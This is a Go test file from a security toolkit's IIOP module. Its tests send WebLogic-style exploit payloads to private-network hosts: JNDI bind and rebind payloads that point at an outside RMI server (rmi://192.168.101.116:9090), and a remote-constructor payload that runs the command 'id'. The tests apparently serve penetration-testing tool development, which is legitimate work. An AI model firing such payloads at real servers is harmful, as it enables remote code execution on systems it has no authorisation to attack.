package iiop

import (
	"yaklang/common/log"
	"yaklang/common/yak/yaklib/codec"
	"testing"
)

func TestGenJtaTransactionManagerPayloadOption(t *testing.T) {
	err := SendPayload("192.168.101.211:7001", GenBindOption("rmi://192.168.101.116:9090/abcdeaa"))
	if err != nil {
		log.Errorf("Send Request error: %v", err)
		return
	}
}
func TestGenRemoteConstructorPayloadOption(t *testing.T) {
	err := SendPayload("192.168.101.211:7004", GenRemoteConstructorPayloadOption("UnicodeSecaa", "id"))
	if err != nil {
		log.Errorf("%v\n", err)
		return
	}
}
func TestRebindPayloadOption(t *testing.T) {
	err := SendPayload("192.168.101.211:7001", GenRebindOption("rmi://192.168.101.116:9090/abcdeaa"))
	if err != nil {
		log.Errorf("Send Request error: %v", err)
		return
	}
}

func TestGetlocateReply(t *testing.T) {
	payload, err := GetRequestPayloadTest()
	_ = payload
	if err != nil {
		log.Errorf("get locate reply error: %v", err)
	}
	//ioutil.WriteFile("/Users/z3/Downloads/request_payload", payload, 0666)
}
func TestIiop(t *testing.T) {
	//conn, err := net.DialTimeout("tcp", "192.168.101.211:7001", 10*time.Millisecond)
	//if err != nil {
	//	log.Infof("Connect target error: %v", err)
	//	return
	//}
	//locateReply, err := GetLocateReply(conn)
	locateReply, err := GetKeyAddressTest()
	if err != nil {
		log.Errorf("get locateReply error: %v", err)
		return
	}

	keyAddress := codec.EncodeToHex(locateReply)
	println(keyAddress)
}

func TestGenpayload(t *testing.T) {
	//resp := GenResponse1("192.168.101.211", 9091)
	//ioutil.WriteFile("/Users/z3/Downloads/resp3.d", resp, 0666)
}
